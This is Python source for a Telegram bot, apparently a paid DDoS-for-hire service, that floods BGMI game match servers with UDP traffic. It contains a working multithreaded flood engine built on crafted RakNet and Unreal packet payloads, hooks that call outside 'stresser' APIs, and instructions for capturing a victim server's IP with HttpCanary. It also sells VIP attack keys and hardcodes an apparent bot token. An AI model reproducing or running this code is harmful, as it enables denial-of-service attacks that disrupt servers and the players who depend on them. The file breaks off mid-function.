import asyncio
import json
import logging
import os
import random
import socket
import threading
import time
import urllib.request
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional

import psutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import NetworkError, TimedOut, TelegramError, BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters
)
from telegram.request import HTTPXRequest

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("BGMI_DDOS_BOT")

# File paths
CONFIG_FILE = "config.json"
DATA_FILE = "users.json"
KEYS_FILE = "keys.json"

# Standalone Commercial Configuration
DEFAULT_CONFIG = {
    "BOT_TOKEN": "8552036925:AAE9Cqg_TnOI3o2j4FTMmWmR6dTU1XLzYi8",
    "ADMIN_IDS": [5615161833],
    "DEFAULT_MAX_TIME": 240,
    "DEFAULT_COOLDOWN": 30,
    "MAX_THREADS_PER_ATTACK": 500,
    "ALLOW_FREE_USERS": True,
    "API_ENDPOINTS": []  # List of external L4 Stresser API URLs
}

# Global state
active_attacks: Dict[int, dict] = {}
user_cooldowns: Dict[int, float] = {}
background_tasks: Set[asyncio.Task] = set()

def load_config() -> dict:
    if not os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump(DEFAULT_CONFIG, f, indent=4)
        except Exception:
            pass
        return DEFAULT_CONFIG.copy()
    try:
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            for k, v in DEFAULT_CONFIG.items():
                if k not in data:
                    data[k] = v
            return data
    except Exception as e:
        logger.warning(f"Using default in-memory config: {e}")
        return DEFAULT_CONFIG.copy()

def save_config(cfg: dict):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=4)
    except Exception:
        pass

def load_users() -> dict:
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_users(users: dict):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(users, f, indent=4)
    except Exception:
        pass

def load_keys() -> dict:
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_keys(keys: dict):
    try:
        with open(KEYS_FILE, "w") as f:
            json.dump(keys, f, indent=4)
    except Exception:
        pass

config = load_config()
users_db = load_users()
keys_db = load_keys()

def is_admin(user_id: int) -> bool:
    return user_id in config.get("ADMIN_IDS", [5615161833])

def is_vip(user_id: int) -> bool:
    if config.get("ALLOW_FREE_USERS", True):
        return True
    if is_admin(user_id):
        return True
    user_str = str(user_id)
    if user_str in users_db:
        expiry_str = users_db[user_str].get("expiry")
        if expiry_str:
            try:
                expiry = datetime.fromisoformat(expiry_str)
                if datetime.now() < expiry:
                    return True
            except Exception:
                pass
    return False

def update_user_attack_stats(user_id: int, duration: int):
    user_str = str(user_id)
    if user_str not in users_db:
        users_db[user_str] = {
            "approved_by": "SYSTEM",
            "expiry": (datetime.now() + timedelta(days=365)).isoformat(),
            "approved_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "total_duration": 0
        }
    users_db[user_str]["total_attacks"] = users_db[user_str].get("total_attacks", 0) + 1
    users_db[user_str]["total_duration"] = users_db[user_str].get("total_duration", 0) + duration
    save_users(users_db)

# Pre-allocated Memory Vector Pool
RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

def generate_state_exhaustion_vectors() -> list:
    vectors = []
    # High-PPS Header Vectors (40-128 bytes - Maximizes Server Interrupts/Sec)
    for _ in range(25):
        t_stamp = os.urandom(8)
        guid = os.urandom(8)
        vectors.append(b"\x01" + t_stamp + RAKNET_MAGIC + guid)  # RakNet Ping (33 bytes)

    for _ in range(15):
        vectors.append(b"\x05" + RAKNET_MAGIC + b"\x0b" + os.urandom(64))  # Open Connection 1

    for _ in range(15):
        vectors.append(b"\x07" + RAKNET_MAGIC + b"\x04\x00\x00\x00" + os.urandom(32))  # Open Connection 2

    for _ in range(15):
        vectors.append(b"\x03\x00\x00\x00" + os.urandom(64))  # Unreal NACK Burst

    for _ in range(10):
        vectors.append(b"\xff\xff\xff\xff\x55\x53" + os.urandom(512))  # Mid MTU Saturation

    return vectors

PRE_GENERATED_PAYLOADS = generate_state_exhaustion_vectors()
PAYLOAD_SIZES = [len(p) for p in PRE_GENERATED_PAYLOADS]
NUM_PRE_PAYLOADS = len(PRE_GENERATED_PAYLOADS)

# High-Performance Match Server Stresser Engine
class MatchServerUDPStresser:
    def __init__(self, target_ip: str, target_port: int, duration: int, threads: int, user_id: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.user_id = user_id
        self.is_running = False
        self.start_time = 0.0
        self.packets_sent = 0
        self.bytes_sent = 0
        self.api_success_count = 0
        self._lock = threading.Lock()
        self._threads_list = []

    def _trigger_external_apis(self):
        """Asynchronously trigger all configured Layer 4 Stresser APIs"""
        api_list = config.get("API_ENDPOINTS", [])
        if not api_list:
            return

        for api_url in api_list:
            try:
                formatted_url = api_url.format(
                    ip=self.target_ip,
                    port=self.target_port,
                    time=self.duration,
                    threads=self.threads,
                    method="UDP-BGMI"
                )
                req = urllib.request.Request(formatted_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    if resp.status == 200:
                        with self._lock:
                            self.api_success_count += 1
                        logger.info(f"Triggered Stresser API: {formatted_url[:40]}...")
            except Exception as e:
                logger.warning(f"Error triggering API endpoint: {e}")

    def _flood_worker(self, stop_time: float):
        target_ports = [
            self.target_port + offset
            for offset in [0, 1, -1, 2, -2, 3, -3, 4, -4]
            if 1 <= (self.target_port + offset) <= 65535
        ]
        num_ports = len(target_ports)

        local_pkts = 0
        local_bytes = 0
        idx = random.randint(0, 1000)

        while self.is_running and time.time() < stop_time:
            sockets = []
            for i in range(num_ports):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                    except Exception:
                        pass
                    t_port = target_ports[i % num_ports]
                    s.connect((self.target_ip, t_port))
                    sockets.append(s)
                except Exception:
                    pass

            if not sockets:
                time.sleep(0.005)
                continue

            num_sockets = len(sockets)

            for _ in range(500):
                if not self.is_running:
                    break
                try:
                    current_sock = sockets[idx % num_sockets]
                    p_idx = idx % NUM_PRE_PAYLOADS
                    payload = PRE_GENERATED_PAYLOADS[p_idx]
                    size = PAYLOAD_SIZES[p_idx]

                    current_sock.send(payload)
                    local_pkts += 1
                    local_bytes += size
                    idx += 1
                except Exception:
                    pass

            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

            if local_pkts > 0:
                with self._lock:
                    self.packets_sent += local_pkts
                    self.bytes_sent += local_bytes
                local_pkts = 0
                local_bytes = 0

        if local_pkts > 0:
            with self._lock:
                self.packets_sent += local_pkts
                self.bytes_sent += local_bytes

    def start(self):
        self.is_running = True
        self.start_time = time.time()
        stop_time = self.start_time + self.duration
        self._threads_list = []

        # Trigger external L4 stresser APIs concurrently in a background thread
        threading.Thread(target=self._trigger_external_apis, daemon=True).start()

        for _ in range(self.threads):
            t = threading.Thread(target=self._flood_worker, args=(stop_time,), daemon=True)
            t.start()
            self._threads_list.append(t)

    def stop(self):
        self.is_running = False

    def get_stats(self) -> dict:
        elapsed = max(1.0, time.time() - self.start_time) if self.start_time else 1.0
        mb_sent = self.bytes_sent / (1024 * 1024)
        mbps = (mb_sent * 8) / elapsed
        pps = self.packets_sent / elapsed
        remaining = max(0, int(self.duration - elapsed))
        progress_pct = min(100, int((elapsed / max(1, self.duration)) * 100))
        
        filled_length = int(10 * progress_pct // 100)
        bar = '█' * filled_length + '░' * (10 - filled_length)

        return {
            "packets": self.packets_sent,
            "bytes_mb": round(mb_sent, 2),
            "mbps": round(mbps, 2),
            "pps": int(pps),
            "elapsed": int(elapsed),
            "remaining": remaining,
            "progress_pct": progress_pct,
            "progress_bar": bar,
            "api_count": self.api_success_count
        }

# Command Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    vip_status = "⚡ VIP MEMBER (ACTIVE)" if is_vip(user_id) else "❌ NOT APPROVED"
    admin_status = "👑 ADMINISTRATOR" if is_admin(user_id) else "👤 USER"

    welcome_text = (
        f"🔥 *BGMI MATCH SERVER FREEZER PRO v5.0* 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* `{user.first_name}` (`{user_id}`)\n"
        f"🔰 *Role:* `{admin_status}`\n"
        f"💎 *Status:* `{vip_status}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📌 *Command Shortcuts:*\n"
        f"• `/attack <IP> <PORT> <SEC> [THREADS]`\n"
        f"• `/attack <IP:PORT> <SEC> [THREADS]` *(Canary Format)*\n"
        f"• `/redeem <KEY>` - Redeem VIP Access Key\n"
        f"• `/stop` - Stop current attack session\n"
        f"• `/status` - Bot Server & Engine Load\n"
        f"• `/myinfo` - Check Subscription & Plan\n"
        f"• `/help` - Full Usage & Canary Setup\n\n"
        f"💡 *Tip:* Paste target direct from HttpCanary:\n"
        f"`/attack 15.206.12.34:17004 120 250`"
    )

    keyboard = [
        [
            InlineKeyboardButton("📖 Usage & Canary Guide", callback_data="btn_help"),
            InlineKeyboardButton("📊 System Status", callback_data="btn_status"),
        ],
        [
            InlineKeyboardButton("👤 Account Profile", callback_data="btn_myinfo"),
        ]
    ]

    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="btn_admin")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 *BGMI FREEZER USER & CANARY GUIDE*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ *Attack Command Syntax:*\n"
        "`/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
        "OR Single Format:\n"
        "`/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
        "👉 *Examples:*\n"
        "• `/attack 15.206.12.34 17004 120 250`\n"
        "• `/attack 15.206.12.34:17004 120`\n"
        "• `/bgmi 15.206.12.34 17004 120 250`\n\n"
        "📲 *How to get IP & Port using HttpCanary:*\n"
        "1. Open HttpCanary on your phone and start capture.\n"
        "2. Enter BGMI match.\n"
        "3. Look for UDP connections with port range `10000 - 20000` (e.g., `15.206.x.x:17004`).\n"
        "4. Copy `IP:PORT` and send in bot command!\n\n"
        "💎 *Key Redemption:*\n"
        "• `/redeem <KEY>` - Redeem VIP Access Key\n\n"
        "⚙️ *System Limits:*\n"
        f"• Max Duration: `{config.get('DEFAULT_MAX_TIME', 240)}s`\n"
        f"• Max Threads: `{config.get('MAX_THREADS_PER_ATTACK', 500)}`\n"
        f"• Cooldown: `{config.get('DEFAULT_COOLDOWN', 30)}s`\n"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_vip(user_id):
        await update.message.reply_text(
            "❌ *Access Denied!* You are not authorized to launch attacks.\n"
            "Use `/redeem <KEY>` or contact Admin for VIP access.",
            parse_mode="Markdown"
        )
        return

    if user_id in active_attacks and active_attacks[user_id]["stresser"].is_running:
        await update.message.reply_text(
            "⚠️ *Attack Session Active!* Use `/stop` or click the inline Stop button before starting another attack.",
            parse_mode="Markdown"
        )
        return

    now = time.time()
    if user_id in user_cooldowns and now < user_cooldowns[user_id]:
        if not is_admin(user_id):
            remaining = int(user_cooldowns[user_id] - now)
            await update.message.reply_text(
                f"⏳ *Cooldown Active!* Please wait `{remaining}s` before launching your next attack.",
                parse_mode="Markdown"
            )
            return

    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Invalid Command Syntax!*\n\n"
            "Usage: `/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
            "Or: `/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
            "Example: `/attack 15.206.12.34 17004 120 250`\n"
            "Example: `/attack 15.206.12.34:17004 120`",
            parse_mode="Markdown"
        )
        return

    if ":" in args[0]:
        try:
            ip, port_str = args[0].split(":")
            port = int(port_str)
            duration = int(args[1])
            threads = int(args[2]) if len(args) >= 3 else 250
        except ValueError:
            await update.message.reply_text("❌ *Error:* Invalid IP:PORT format or duration integer!", parse_mode="Markdown")
            return
    else:
        if len(args) < 3:
            await update.message.reply_text("❌ *Error:* Missing Port or Duration! Use `/attack <IP> <PORT> <SECONDS>`", parse_mode="Markdown")
            return
        ip = args[0]
        try:
            port = int(args[1])
            duration = int(args[2])
            threads = int(args[3]) if len(args) >= 4 else 250
        except ValueError:
            await update.message.reply_text("❌ *Error:* Port, Time, and Threads must be valid integers!", parse_mode="Markdown")
            return

    ip_warning = ""
    if ip.startswith("34.") or ip.startswith("142.") or ip.startswith("172."):
        ip_warning = (
            "\n⚠️ *Note:* Target IP `34.x.x.x` belongs to Google Cloud / Telemetry / Voice Chat.\n"
            "In HttpCanary, look specifically for *Krafton AWS Game Server UDP IPs* (e.g. `15.206.x.x`, `13.126.x.x`, `3.108.x.x`, `43.204.x.x`).\n"
        )

    max_duration = config.get("DEFAULT_MAX_TIME", 240)
    max_threads = config.get("MAX_THREADS_PER_ATTACK", 500)

    if duration > max_duration and not is_admin(user_id):
        duration = max_duration

    if threads > max_threads and not is_admin(user_id):
        threads = max_threads

    stresser = MatchServerUDPStresser(target_ip=ip, target_port=port, duration=duration, threads=threads, user_id=user_id)
    stresser.start()

    active_attacks[user_id] = {
        "stresser": stresser,
        "ip": ip,
        "port": port,
        "duration": duration,
        "start_time": time.time(),
        "threads": threads
    }

    cooldown_time = 5 if is_admin(user_id) else config.get("DEFAULT_COOLDOWN", 30)
    user_cooldowns[user_id] = time.time() + duration + cooldown_time
    update_user_attack_stats(user_id, duration)

    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    api_endpoints_count = len(config.get("API_ENDPOINTS", []))
    api_status_str = f"🌐 *API Cluster:* `{api_endpoints_count} Stresser Nodes Active`\n" if api_endpoints_count > 0 else ""

    initial_stats = stresser.get_stats()
    sent_msg = await update.message.reply_text(
        f"⚡ *BGMI MATCH FREEZE LAUNCHED!* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 *Target Host:* `{ip}`\n"
        f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±4)*\n"
        f"⏱️ *Duration:* `{duration} Seconds`\n"
        f"🧵 *Threads:* `{threads} Engine Threads`\n"
        f"👤 *Operator:* `{update.effective_user.first_name}`\n"
        f"{api_status_str}"
        f"{ip_warning}"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *Live Traffic Dashboard:*\n"
        f"├─ *Sent Packets:* `0`\n"
        f"├─ *Data Volume:* `0 MB`\n"
        f"├─ *Bandwidth:* `0 Mbps`\n"
        f"└─ *Progress:* `[{initial_stats['progress_bar']}] 0%`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *Status:* `SENDING RAKNET/UNREAL CONNECTED FLOOD...`",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    async def live_dashboard_updater():
        while user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
            await asyncio.sleep(3)
            if not stresser.is_running:
                break
            stats = stresser.get_stats()
            updated_text = (
                f"⚡ *BGMI MATCH FREEZE ACTIVE!* ⚡\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 *Target Host:* `{ip}`\n"
                f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±4)*\n"
                f"⏱️ *Remaining:* `{stats['remaining']}s / {duration}s`\n"
                f"🧵 *Threads:* `{threads} Engine Threads`\n"
                f"👤 *Operator:* `{update.effective_user.first_name}`\n"
                f"{api_status_str}"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 *Live Traffic Dashboard:*\n"
                f"├─ *Sent Packets:* `{stats['packets']:,}`\n"
                f"├─ *Data Volume:* `{stats['bytes_mb']} MB`\n"
                f"├─ *Bandwidth Rate:* `{stats['mbps']} Mbps` (`{stats['pps']:,} PPS`)\n"
                f"└─ *Progress:* `[{stats['progress_bar']}] {stats['progress_pct']}%`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔥 *Status:* `RAKNET / UNREAL CONNECTED FREEZE ACTIVE`"
            )
            try:
                await sent_msg.edit_text(updated_text, parse_mode="Markdown", reply_markup=reply_markup)
            except Exception:
                pass

        if user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
            stresser.stop()
            stats = stresser.get_stats()
            del active_attacks[user_id]
            try:
                await sent_msg.edit_text(
                    f"✅ *BGMI MATCH FREEZE COMPLETED!* ✅\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 *Target:* `{ip}:{port}`\n"
                    f"⏱️ *Duration:* `{duration} Seconds`\n"
                    f"📦 *Total Packets:* `{stats['packets']:,}`\n"
                    f"📊 *Data Transferred:* `{stats['bytes_mb']} MB`\n"
                    f"🚀 *Avg Bandwidth:* `{stats['mbps']} Mbps` (`{stats['pps']:,} PPS`)\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏁 *Status:* `Attack Finished Successfully`",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending completion message: {e}")

    task = asyncio.create_task(live_dashboard_updater())
    background_tasks.add(task)
    task.add_done_callback(background_tasks.discard)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_attacks:
        info = active_attacks[user_id]
        stresser = info["stresser"]
        stresser.stop()
        stats = stresser.get_stats()
        del active_attacks[user_id]
        await update.message.reply_text(
            f"🛑 *ATTACK SESSION TERMINATED!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 *Target Host:* `{info['ip']}:{info['port']}`\n"
            f"📦 *Packets Sent:* `{stats['packets']:,}`\n"
            f"📊 *Data Volume:* `{stats['bytes_mb']} MB`",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚠️ *No active attack session running for your account.*", parse_mode="Markdown")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active_count = len([a for a in active_attacks.values() if a["stresser"].is_running])

    cpu_usage = psutil.cpu_percent(interval=None)
    ram_usage = psutil.virtual_memory().percent

    text = (
        f"📊 *BOT ENGINE SYSTEM STATUS*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 *Active Attacks:* `{active_count}`\n"
        f"👥 *Registered VIP Users:* `{len(users_db)}`\n"
        f"🌐 *Configured L4 APIs:* `{len(config.get('API_ENDPOINTS', []))}`\n"
        f"💻 *CPU Load:* `{cpu_usage}%`\n"
        f"🧠 *RAM Usage:* `{ram_usage}%`\n"
        f"⚡ *Engine Status:* `OPERATIONAL (High Throughput)`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )

    if active_count > 0:
        text += "🔥 *Live Active Attack Sessions:*\n"
        for uid, a in active_attacks.items():
            st = a["stresser"].get_stats()
            text += f"• `{a['ip']}:{a['port']}` | Time: `{st['elapsed']}/{a['duration']}s` | Thr: `{a['threads']}` | `{st['mbps']} Mbps`\n"

    await update.message.reply_text(text, parse_mode="Markdown")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_str = str(user_id)
    is_adm = is_admin(user_id)

    if is_adm:
        exp_text = "PERMANENT (ADMINISTRATOR)"
    elif user_str in users_db:
        exp_text = users_db[user_str].get("expiry", "Unknown")
        try:
            dt = datetime.fromisoformat(exp_text)
            exp_text = dt.strftime("%Y-%m-%d %H:%M")
        except Exception:
            pass
    else:
        exp_text = "❌ NOT APPROVED"

    user_data = users_db.get(user_str, {})
    total_attacks = user_data.get("total_attacks", 0)
    total_duration = user_data.get("total_duration", 0)

    info_text = (
        f"👤 *YOUR USER ACCOUNT PROFILE*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"👑 *Role:* `{'ADMINISTRATOR' if is_adm else 'VIP USER'}`\n"
        f"💎 *VIP Expiry:* `{exp_text}`\n"
        f"🚀 *Total Attacks Launched:* `{total_attacks}`\n"
        f"⏱️ *Total Attack Time:* `{total_duration} Seconds`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    await update.message.reply_text(info_text, parse_mode="Markdown")

# Key Generation & Redemption Commands
async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    days = int(args[0]) if len(args) >= 1 and args[0].isdigit() else 30

    import uuid
    raw_key = str(uuid.uuid4()).upper()[:8]
    key_str = f"BGMI-{days}D-{raw_key}"

    keys_db[key_str] = {
        "days": days,
        "created_by": update.effective_user.id,
        "created_at": datetime.now().isoformat(),
        "redeemed": False,
        "redeemed_by": None
    }
    save_keys(keys_db)

    await update.message.reply_text(
        f"🔑 *VIP ACCESS KEY GENERATED!* 🔑\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎫 *Key:* `{key_str}`\n"
        f"⏱️ *Duration:* `{days} Days`\n\n"
        f"👉 *Redeem Command:* `/redeem {key_str}`",
        parse_mode="Markdown"
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_str = str(user_id)
    args = context.args

    if len(args) < 1:
        await update.message.reply_text("Syntax: `/redeem <KEY>`", parse_mode="Markdown")
        return

    target_key = args[0].strip().upper()

    if target_key not in keys_db or keys_db[target_key].get("redeemed", False):
        await update.message.reply_text("❌ *Invalid or Already Redeemed Key!*", parse_mode="Markdown")
        return

    key_data = keys_db[target_key]
    days = key_data.get("days", 30)

    expiry = datetime.now() + timedelta(days=days)
    if user_str not in users_db:
        users_db[user_str] = {}

    users_db[user_str].update({
        "approved_by": f"KEY:{target_key}",
        "expiry": expiry.isoformat(),
        "approved_at": datetime.now().isoformat()
    })
    save_users(users_db)

    key_data["redeemed"] = True
    key_data["redeemed_by"] = user_id
    key_data["redeemed_at"] = datetime.now().isoformat()
    save_keys(keys_db)

    await update.message.reply_text(
        f"🎉 *VIP ACCESS ACTIVATED!* 🎉\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *User:* `{update.effective_user.first_name}` (`{user_id}`)\n"
        f"⏱️ *Duration:* `{days} Days`\n"
        f"📅 *Expiry Date:* `{expiry.strftime('%Y-%m-%d %H:%M')}`\n\n"
        f"🚀 You can now launch attacks using `/attack <IP:PORT> <TIME>`!",
        parse_mode="Markdown"
    )

# Admin API Management Commands
async def addapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "Syntax: `/addapi <URL>`\n\n"
            "Placeholders supported in URL:\n"
            "`{ip}`, `{port}`, `{time}`, `{threads}`, `{method}`\n\n"
            "Example:\n"
            "`/addapi http://api.stresser.net/attack?host={ip}&port={port}&time={time}`",
            parse_mode="Markdown"
        )
        return

    api_url = args[0]
    api_list = config.get("API_ENDPOINTS", [])
    api_list.append(api_url)
    config["API_ENDPOINTS"] = api_list
    save_config(config)

    await update.message.reply_text(f"✅ *Stresser API Added Successfully!*\nTotal APIs: `{len(api_list)}`", parse_mode="Markdown")

async def apis_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    api_list = config.get("API_ENDPOINTS", [])
    if not api_list:
        await update.message.reply_text("ℹ️ *No external L4 Stresser APIs configured.*", parse_mode="Markdown")
        return

    text = "🌐 *CONFIGURED L4 STRESSER APIS:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, url in enumerate(api_list):
        text += f"`[{i}]` {url}\n"
    text += "\nRemove syntax: `/removeapi <index>`"

    await update.message.reply_text(text, parse_mode="Markdown")

async def removeapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1 or not args[0].isdigit():
        await update.message.reply_text("Syntax: `/removeapi <index>`", parse_mode="Markdown")
        return

    idx = int(args[0])
    api_list = config.get("API_ENDPOINTS", [])
    if 0 <= idx < len(api_list):
        removed = api_list.pop(idx)
        config["API_ENDPOINTS"] = api_list
        save_config(config)
        await update.message.reply_text(f"✅ Removed API `[{idx}]` successfully.", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Invalid API index!", parse_mode="Markdown")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Syntax: `/approve <user_id> [days]`", parse_mode="Markdown")
        return

    target_id = args[0]
    days = int(args[1]) if len(args) >= 2 else 30
    expiry = datetime.now() + timedelta(days=days)

    if target_id not in users_db:
        users_db[target_id] = {}

    users_db[target_id].update({
        "approved_by": update.effective_user.id,
        "expiry": expiry.isoformat(),
        "approved_at": datetime.now().isoformat()
    })
    save_users(users_db)

    await update.message.reply_text(
        f"✅ *User Approved Successfully!*\n\n"
        f"🆔 *User ID:* `{target_id}`\n"
        f"⏱️ *Duration:* `{days} Days`\n"
        f"📅 *Expiry Date:* `{expiry.strftime('%Y-%m-%d %H:%M')}`",
        parse_mode="Markdown"
    )

async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Syntax: `/disapprove <user_id>`", parse_mode="Markdown")
        return

    target_id = args[0]
    if target_id in users_db:
        del users_db[target_id]
        save_users(users_db)
        await update.message.reply_text(f"✅ User `{target_id}` removed from VIP list.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"⚠️ User `{target_id}` is not found in VIP list.", parse_mode="Markdown")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    if not users_db:
        await update.message.reply_text("ℹ️ *No VIP Users registered in database.*", parse_mode="Markdown")
        return

    text = "📜 *VIP APPROVED USERS LIST:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in users_db.items():
        exp = data.get('expiry', 'N/A')
        try:
            exp = datetime.fromisoformat(exp).strftime("%Y-%m-%d")
        except Exception:
            pass
        text += f"• `{uid}` | Expiry: `{exp}` | Attacks: `{data.get('total_attacks', 0)}`\n"

    await update.message.reply_text(text, parse_mode="Markdown")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    msg_text = " ".join(context.args)
    if not msg_text:
        await update.message.reply_text("Syntax: `/broadcast <message>`", parse_mode="Markdown")
        return

    count = 0
    broadcast_msg = f"📢 *ADMIN ANNOUNCEMENT* 📢\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{msg_text}"
    for uid in list(users_db.keys()):
        try:
            await context.bot.send_message(chat_id=int(uid), text=broadcast_msg, parse_mode="Markdown")
            count += 1
        except Exception:
            pass

    await update.message.reply_text(f"✅ Broadcast sent to `{count}` users.", parse_mode="Markdown")

async def reload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
        return

    global config, users_db, keys_db
    config = load_config()
    users_db = load_users()
    keys_db = load_keys()
    await update.message.reply_text("🔄 *Config and User Database Reloaded!*", parse_mode="Markdown")

# Inline button click callback handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    user_id = query.from_user.id

    if data == "btn_help":
        await help_command(query, context)
    elif data == "btn_status":
        await status_command(query, context)
    elif data == "btn_myinfo":
        await myinfo_command(query, context)
    elif data == "btn_admin":
        if is_admin(user_id):
            admin_text = (
                "👑 *ADMIN CONTROL PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "• `/approve <id> [days]` - Approve user\n"
                "• `/disapprove <id>` - Remove user\n"
                "• `/genkey <days>` - Generate VIP Key\n"
                "• `/addapi <url>` - Add L4 Stresser API\n"
                "• `/apis` - List configured L4 APIs\n"
                "• `/removeapi <idx>` - Remove API\n"
                "• `/users` - VIP user list\n"
